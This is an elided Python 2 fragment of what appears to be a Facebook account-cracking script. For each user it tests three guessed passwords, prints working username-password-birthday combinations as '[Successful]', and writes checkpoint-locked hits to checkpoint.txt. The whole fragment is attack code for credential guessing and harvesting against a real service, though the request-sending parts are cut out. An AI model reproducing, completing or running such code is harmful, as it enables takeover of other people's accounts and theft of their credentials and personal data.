	...
	def main(arg):
		...
		try:
			...
			if "access_token" in q:
				print "\x1b[1;92m[Successful]\x1b[0m " + user + " | " + pass1 + " | " +c['birthday']
				oks.append(user+pass1)
			else:
				if "www.facebook.com" in q["error_msg"]:
					print "[Checkpoint] " + user + " | " + pass1 + " | " +c['birthday']
					cps = open("checkpoint.txt", "a")
					cps.write(user+"|"+pass1+"|" +c['birthday'])
					cps.close()
			...
			q = json.load(data)
			if "access_token" in q:
				print "\x1b[1;92m[Successful]\x1b[0m " + user + " | " + pass2 + " | " +c['birthday']
				oks.append(user+pass2)
			else:
				if "www.facebook.com" in q["error_msg"]:
					print "[Checkpoint] " + user + " | " + pass2 + " | " +c['birthday']
					cps = open("checkpoint.txt", "a")
					cps.write(user+"|"+pass2+"|" +c['birthday'])
					cps.close()
			...
			q = json.load(data)
			if "access_token" in q:
				print "\x1b[1;92m[Successful]\x1b[0m " + user + " | " + pass3 + " | " +c['birthday']
				oks.append(user+pass3)
			else:
				if "www.facebook.com" in q["error_msg"]:
					print "[Checkpoint] " + user + " | " + pass3 + " | " +c['birthday']
					cps = open("checkpoint.txt", "a")
					cps.write(user+"|"+pass3+"|" +c['birthday'])
					cps.close()
